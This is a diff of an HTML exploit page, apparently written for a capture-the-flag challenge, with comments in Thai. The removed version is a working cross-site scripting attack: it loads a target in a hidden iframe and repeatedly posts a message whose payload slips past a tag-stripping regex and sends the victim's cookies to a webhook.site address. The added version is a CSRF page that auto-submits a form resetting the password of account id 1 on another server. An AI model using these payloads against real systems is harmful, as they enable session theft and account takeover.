@@ -1,37 +1,15 @@
 <!DOCTYPE html>
 <html>
-<head><meta charset="UTF-8"><title>x</title></head>
-<body>
-<iframe id="f" src="http://34.87.93.26:3000/video.html?v=featured"
-        style="width:1px;height:1px;border:0;position:absolute;top:-9999px"></iframe>
-<script>
-const EXFIL = "https://webhook.site/c8b5eb75-9989-4b28-8dfa-6b11ee60562f";
-const TARGET_ORIGIN = "http://34.87.93.26:3000";
-// Bypass: regex /<\/?([a-zA-Z][a-zA-Z0-9]*)\b[^>]*>/gi หยุดที่ > แรก
-// <img src=">" onerror=...> -> regex match <img src="> เท่านั้น
-// onerror=fetch(...) หลุดออกมาเป็น attribute ที่ browser อ่านได้
-const payload = `<img src=">" onerror=fetch('${EXFIL}?c='+encodeURIComponent(document.cookie))>`;
-const msg = JSON.stringify({type:"overlay-update", content: payload});
-
-const frame = document.getElementById('f');
-
-// ยิง postMessage ทุก 500ms ตั้งแต่เริ่มต้นเลย
-// ไม่รอ onload เพราะ bot อาจ timeout ก่อน
-const interval = setInterval(function() {
-  try {
-    frame.contentWindow.postMessage(msg, TARGET_ORIGIN);
-  } catch(e) {}
-}, 500);
-
-// หยุดหลัง 7 วิ
-setTimeout(function() { clearInterval(interval); }, 7000);
-
-// onload เป็น backup
-frame.onload = function() {
-  try {
-    frame.contentWindow.postMessage(msg, TARGET_ORIGIN);
-  } catch(e) {}
-};
-</script>
-</body>
+  <body>
+  <script>history.pushState('', '', '/')</script>
+    <form method="GET" action="http://35.240.206.245/save_profile.php?password=test&cpassword=test&id=1">
+        <input type="hidden" name="id" value="1" />
+        <input type="hidden" name="password" value="test" />
+        <input type="hidden" name="cpassword" value="test" />
+      <input type="submit" value="Submit request" />
+    </form>
+    <script>
+      document.forms[0].submit();
+    </script>
+  </body>
 </html>
